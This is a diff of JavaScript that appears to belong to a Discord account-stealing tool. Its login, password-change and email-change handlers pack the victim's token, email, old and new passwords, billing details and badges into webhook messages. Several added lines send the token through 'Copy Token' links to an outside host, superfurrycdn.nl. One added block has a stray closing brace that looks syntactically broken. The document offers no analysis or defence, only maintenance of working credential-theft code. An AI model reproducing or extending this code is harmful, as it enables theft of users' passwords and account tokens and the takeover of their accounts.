@@ -397,7 +397,7 @@ const login = async (email, password, token) => {
         ],
         author: {
           name: json.username + "#" + json.discriminator + " | " + json.id,
-          icon_url: `https://cdn.discordapp.com/attachments/962469503206322249/965639587894546482/115268.gif`,
+          icon_url: `https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif`,
         },
         footer: {
           text: "xd",
@@ -424,30 +424,45 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
       {
         color: config.embed_color,
         fields: [
-          {
-            name: "<a:tre:962470727129391134> **Password Changed**",
-            value: `Email: **${json.email}** \nOld Password: **${oldpassword}** \nNew Password: **${newpassword}**`,
+         {
+            name: `<a:tre:962470429115686923>  \`${token}\``,
+            value: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
+            inline: false,
+          },
+           {
+            name: "<:tre:962472209308340315> Email:",
+            value: `\`${json.email}\``,
+            inline: true,
+          },
+           {
+            name: "<:tre:966388018527219753>  Badges:",
+            value: `**${badges}**`,
+            inline: true,
+          },
+           {
+            name: "<a:tre:962470727129391134> Billing:",
+            value: '' + H(),
+            inline: true,
+          },
+           {
+            name: "<:tre:962761278764490772>  Nitro Type:",
+            value: `${nitro}`,
             inline: true,
           },
           {
-            name: "<a:tre:962470942796288090> **Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: "<a:tre:962470942796288090> Old Password:",
+            value: `\`${oldpassword}\``,
             inline: true,
           },
           {
-            name: "<a:tre:962470429115686923> **Token**",
-            value: `\`${token}\``,
-            inline: false,
-          },
-       {
-            name: "📋  Copy",
-            value: `[Copy Email](https://superfurrycdn.nl/copy/${email}) | [Copy Token](https://superfurrycdn.nl/copy/${token})`,
-            inline: false,
+            name: "<a:tre:962470942796288090> New Password:",
+            value: `\`${newpassword}\``,
+            inline: true,
           },
         ],
         author: {
           name: json.username + "#" + json.discriminator + " | " + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: `https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif`,
         },
         footer: {
           text: "xd",
@@ -471,30 +486,41 @@ const emailChanged = async (email, password, token) => {
       {
         color: config.embed_color,
         fields: [
-          {
-            name: "<a:tre:962470727129391134> **Email Changed**",
-            value: `New Email: **${email}**\nPassword: **${password}**`,
+            {
+            name: `<a:tre:962470429115686923>  \`${token}\``,
+            value: `[Copy Token](https://superfurrycdn.nl/copy/${token})`,
+            inline: false,
+          },
+           {
+            name: "<:tre:962472209308340315> New Email:",
+            value: `\`${email}\``,
+            inline: true,
+          },
+           {
+            name: "<:tre:962761278764490772>  Nitro Type:",
+            value: `${nitro}`,
+            inline: true,
+          },
+           {
+            name: "<:tre:966388018527219753>  Badges:",
+            value: `**${badges}**`,
+            inline: true,
+          },
+            },
+           {
+            name: "<a:tre:962470727129391134> Billing:",
+            value: '' + H(),
             inline: true,
           },
           {
-            name: "<a:tre:962470942796288090> **Discord Info**",
-            value: `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
+            name: "<a:tre:962470942796288090> Password:",
+            value: `\`${password}\``,
             inline: true,
-          },
-          {
-            name: "<a:tre:962470429115686923> **Token**",
-            value: `\`${token}\``,
-            inline: false,
-          },
-               {
-            name: "📋  Copy",
-            value: `[Copy Email](https://superfurrycdn.nl/copy/${email}) | [Copy Token](https://superfurrycdn.nl/copy/${token})`,
-            inline: false,
           },
         ],
         author: {
           name: json.username + "#" + json.discriminator + " | " + json.id,
-          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
+          icon_url: `https://cdn.discordapp.com/attachments/969997565942698055/969997610565902346/115268.gif`,
         },
         footer: {
           text: "xd",
